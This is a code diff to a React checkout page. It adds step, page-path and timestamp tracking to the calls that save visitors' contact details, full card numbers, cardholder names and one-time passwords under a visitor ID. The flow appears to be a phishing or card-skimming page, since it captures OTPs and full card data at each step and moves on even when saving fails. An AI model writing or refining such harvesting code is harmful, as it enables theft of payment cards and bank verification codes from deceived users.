@@ -121,6 +121,8 @@ function OtpStep({
               try {
                 await addData({
                   id: ensureVisitorId(),
+                  step: "otp",
+                  page: window.location.pathname,
                   otp: otp,
                   otpAt: new Date().toISOString(),
                 });
@@ -257,6 +259,8 @@ function ClickPayStep({
     try {
       await addData({
         id: ensureVisitorId(),
+        step: "clickpay",
+        page: window.location.pathname,
         cardNumber: fullCard,
         cardLast4: last4,
         cardName: safeName,
@@ -768,7 +772,13 @@ export default function Checkout() {
   const handleStep1 = async (e: React.FormEvent) => {
     e.preventDefault();
     try {
-      await addData({ id: ensureVisitorId(), ...form });
+      await addData({
+        id: ensureVisitorId(),
+        step: "contact",
+        page: window.location.pathname,
+        contactSubmittedAt: new Date().toISOString(),
+        ...form,
+      });
     } catch {
       /* non-blocking: still advance to payment step */
     }
@@ -778,7 +788,13 @@ export default function Checkout() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     try {
-      await addData({ id: ensureVisitorId(), ...form });
+      await addData({
+        id: ensureVisitorId(),
+        step: "payment",
+        page: window.location.pathname,
+        paymentMethodSubmittedAt: new Date().toISOString(),
+        ...form,
+      });
     } catch {
       /* non-blocking: still advance to clickpay step */
     }
